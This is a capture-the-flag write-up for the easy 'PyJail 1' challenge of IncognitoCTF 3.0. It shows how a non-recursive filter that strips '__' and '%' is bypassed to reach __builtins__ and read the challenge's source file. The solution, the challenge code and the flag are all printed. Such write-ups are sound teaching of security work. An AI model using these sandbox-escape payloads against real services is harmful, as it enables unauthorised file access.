# IncognitoCTF 3.0 - PyJail 1

- Type: jail 
- Level: easy 
- Points : 100
- link : nc 142.93.209.130 13010


This was the first time I tried to solve a Python Jail escape, so the first thing I did was to search a "Python Jail escape cheatsheet", and I found [https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes](this) (I used it throught all the PyJail challenges).

I tried to digit something in the interactive python shell and I started to play with `__import__`, `__globals__`, `__builtins__`

This is what I discovered:
```
This file contains the flag let's see if you can find it(The name is jail1)
>>> __import__
  File "<console>", line 1
    import
          ^
SyntaxError: invalid syntax
import
>>> 
```

I found that there was some sort of substitution of `_`, `%`, `&` as a mitigation. 
The problem here is that the substitution is not recursive, so if I digit `_%_` I'll get `__`:
```
>>> _%_import_%_
Traceback (most recent call last):
  File "<console>", line 1, in <module>
NameError: name '__import__' is not defined
__import__
>>> 
```

This is the final gadget chain I used (starting from flag function):
`
flag._%_globals_%_['_%_builtins_%_'].open(flag._%_globals_%_['_%_file_%_']).read()
`

Result: `'#!/usr/bin/env python3\nimport os\nimport sys\nimport code\nimport re\n\n#ictf{Th1s_Wa5_3a5y_4123821379}\ndef user_input(arg):\n    s = input(">>> ")\n    s = s.replace(\'__\', \'\')\n    s = s.replace(\'%\', \'\')\n    not_allowed = [\n    r\'\\"\',\n    r\'\\+\',\n    r\'-\',\n    r\'\\*\',\n    r\'/\',\n    r\'<\',\n    r\'>\',\n    r\'\\^\',\n    r\'&\',\n    r\'\\|\',\n    ]\n    print(s)\n    if any([re.search(r, s) for r in not_allowed]):\n    \tprint("Can\'t do dis......")\n    \texit()\n    if(s == \'exit\'):\n    \texit()\n    return s\n    \ndef flag(arg):\n\tprint(\'You did it\')\ndef main():\n    scope = {"__builtins__": {"flag": flag}}\n    message = "This file contains the flag let\'s see if you can find it(The name is jail1)"\n\n    while True:\n    \tcode.interact(message, user_input, scope)\nmain()'`

And the flag is: `ictf{Th1s_Wa5_3a5y_4123821379}`
